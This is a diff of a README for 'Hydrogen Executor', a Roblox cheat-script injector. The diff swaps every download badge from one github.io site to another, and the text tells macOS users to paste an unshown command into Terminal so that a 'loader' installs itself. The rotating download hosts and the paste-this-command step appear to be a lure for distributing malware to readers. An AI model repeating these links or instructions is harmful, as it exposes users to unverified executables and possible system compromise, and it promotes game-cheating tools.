@@ -10,8 +10,8 @@ Hydrogen Executor is the go-to free executor for Android and Windows users, trus
 
 <div align="center">
 
-[![Download Hydrogen Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
+[![Download Hydrogen Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
 
 </div>
 
@@ -41,14 +41,14 @@ Hydrogen Executor is the go-to free executor for Android and Windows users, trus
 4. **🎮 Join any Roblox game**
 5. **⚡ Click Inject** — load your script and Execute
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20HYDROGEN%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20HYDROGEN%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
 
 ### 🍎 macOS
 1. Press `⌘ + Space`, type **Terminal**, hit Enter
 2. Paste the command and press Enter
 3. Follow the prompts — the loader installs automatically
 
-[![Mac Download](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
+[![Mac Download](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
 
 ---
 
@@ -84,5 +84,5 @@ Hydrogen Executor is the go-to free executor for Android and Windows users, trus
 
 ---
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20HYDROGEN%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20HYDROGEN%20🔻-purple?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://hydracomptrollercord.github.io/MacDownloader/)
